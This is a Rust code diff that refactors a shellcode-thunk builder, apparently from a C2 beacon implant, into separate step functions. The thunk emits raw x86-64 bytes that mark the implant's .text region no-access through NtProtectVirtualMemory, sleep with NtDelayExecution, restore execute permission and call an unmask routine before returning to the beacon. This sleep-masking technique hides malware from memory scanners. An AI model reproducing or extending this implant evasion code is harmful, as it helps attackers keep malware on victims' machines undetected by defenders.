@@ -66,6 +66,35 @@ pub fn build(
     let delay: i64 = -((seconds as i64).saturating_mul(10_000_000));
     let mut b = Vec::with_capacity(THUNK_MAX);
 
+    build_data_block(
+        &mut b,
+        protect_tramp,
+        delay_tramp,
+        text_base,
+        text_len,
+        delay,
+        unmask_fn,
+    );
+    build_step1(&mut b);
+    build_step2(&mut b);
+    build_step3(&mut b);
+    build_step4(&mut b);
+    build_epilogue(&mut b);
+
+    let len = b.len();
+    Thunk { bytes: b, len }
+}
+
+/// Prologue: emit the R10-relative data block and the LEA that points R10 at it.
+fn build_data_block(
+    b: &mut Vec<u8>,
+    protect_tramp: usize,
+    delay_tramp: usize,
+    text_base: usize,
+    text_len: usize,
+    delay: i64,
+    unmask_fn: usize,
+) {
     // ---- Data block (offsets from R10) ----
     // +0x00: protect_trampoline
     b.extend(&(protect_tramp as u64).to_le_bytes());
@@ -98,8 +127,10 @@ pub fn build(
     b.push(0x8D);
     b.push(0x15);
     b.extend(&rel.to_le_bytes());
+}
 
-    // === Step 1: NtProtectVirtualMemory(-1, &base, &len, PAGE_NOACCESS=1, &old) ===
+/// Step 1: NtProtectVirtualMemory(-1, &base, &len, PAGE_NOACCESS=1, &old).
+fn build_step1(b: &mut Vec<u8>) {
     // rcx = -1
     b.push(0x48);
     b.push(0xC7);
@@ -147,8 +178,10 @@ pub fn build(
     b.push(0x83);
     b.push(0xC4);
     b.push(0x28);
+}
 
-    // === Step 2: NtDelayExecution(FALSE, &delay) ===
+/// Step 2: NtDelayExecution(FALSE, &delay).
+fn build_step2(b: &mut Vec<u8>) {
     // rcx = 0
     b.push(0x48);
     b.push(0x31);
@@ -173,8 +206,10 @@ pub fn build(
     b.push(0x83);
     b.push(0xC4);
     b.push(0x28);
+}
 
-    // === Step 3: NtProtectVirtualMemory(-1, &base, &len, PAGE_EXECUTE_READ=0x20, &dummy) ===
+/// Step 3: NtProtectVirtualMemory(-1, &base, &len, PAGE_EXECUTE_READ=0x20, &dummy).
+fn build_step3(b: &mut Vec<u8>) {
     // rcx = -1
     b.push(0x48);
     b.push(0xC7);
@@ -219,21 +254,23 @@ pub fn build(
     b.push(0x83);
     b.push(0xC4);
     b.push(0x28);
+}
 
-    // === Step 4: mem::unmask() — inline, BEFORE returning to the beacon ===
-    // CRIT-5: this is the PRIMARY unmask path, NOT MaskGuard::drop. The RX
-    // restore above has made .text executable again, so the beacon thread could
-    // touch a masked data region the instant we return — unmasking must happen
-    // HERE, on the (always-RX) thunk page, closing the hardware-exception
-    // window described in the crate-level "Step 4" doc.
-    //
-    // Encoding: `mov rax, [r10+0x30]; sub rsp,0x28; call rax; add rsp,0x28`.
-    // We deliberately do NOT rely on R10 holding the unmask VA directly — R10
-    // points at the data block, and [r10+0x30] is the unmask_fn slot (absolute
-    // VA, robust to the syscall-stub R10 clobber). `unmask` is idempotent
-    // (MASK_STATE 1→0 CAS), so the later MaskGuard::drop unmask is a harmless
-    // no-op — real defense in depth.
-    //
+/// Step 4: mem::unmask() — inline, BEFORE returning to the beacon.
+///
+/// CRIT-5: this is the PRIMARY unmask path, NOT MaskGuard::drop. The RX
+/// restore above has made .text executable again, so the beacon thread could
+/// touch a masked data region the instant we return — unmasking must happen
+/// HERE, on the (always-RX) thunk page, closing the hardware-exception
+/// window described in the crate-level "Step 4" doc.
+///
+/// Encoding: `mov rax, [r10+0x30]; sub rsp,0x28; call rax; add rsp,0x28`.
+/// We deliberately do NOT rely on R10 holding the unmask VA directly — R10
+/// points at the data block, and [r10+0x30] is the unmask_fn slot (absolute
+/// VA, robust to the syscall-stub R10 clobber). `unmask` is idempotent
+/// (MASK_STATE 1→0 CAS), so the later MaskGuard::drop unmask is a harmless
+/// no-op — real defense in depth.
+fn build_step4(b: &mut Vec<u8>) {
     // rax = [r10 + 0x30]  (mov rax,[r10+disp8]: REX.W+B=0x49, 0x8B, modrm=0x42, disp8=0x30)
     b.push(0x49);
     b.push(0x8B);
@@ -252,10 +289,9 @@ pub fn build(
     b.push(0x83);
     b.push(0xC4);
     b.push(0x28);
+}
 
-    // === Return ===
+/// Epilogue: ret back to the beacon.
+fn build_epilogue(b: &mut Vec<u8>) {
     b.push(0xC3);
-
-    let len = b.len();
-    Thunk { bytes: b, len }
 }
